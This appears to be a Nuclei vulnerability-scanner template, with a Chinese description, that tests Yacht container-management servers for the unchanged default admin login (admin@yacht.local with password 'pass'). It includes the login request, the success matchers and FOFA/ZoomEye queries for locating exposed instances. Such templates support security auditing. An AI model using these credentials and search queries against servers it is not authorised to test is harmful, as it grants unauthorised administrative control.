id: yacht-default-login

info:
  name: Yacht 默认口令登录（弱口令）
  author: Fur1na
  severity: high
  description: |
    该模板通过尝试 Yacht 的默认管理员账号口令（如 admin@yacht.local:pass），并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者通常可直接获得后台管理权限，进一步访问敏感信息、修改配置或执行未授权操作。
  reference:
    - https://github.com/SelfhostedPro/Yacht
    - https://dev.yacht.sh/docs/Installation/Getting_Started
  metadata:
    verified: true
    max-request: 1
    fofa-query: app="Yacht"
    zoomeye-query: app="Yacht"
  tags: default-login,yacht,misconfig,vuln

variables:
  username: "admin@yacht.local"
  password: "pass"

http:
  - raw:
      - |
        POST /api/auth/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"username": "{{username}}", "password": "{{password}}"}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"access_token":'
          - ':"successful"'
        condition: and

      - type: word
        part: content_type
        words:
          - 'application/json'

      - type: status
        status:
          - 200
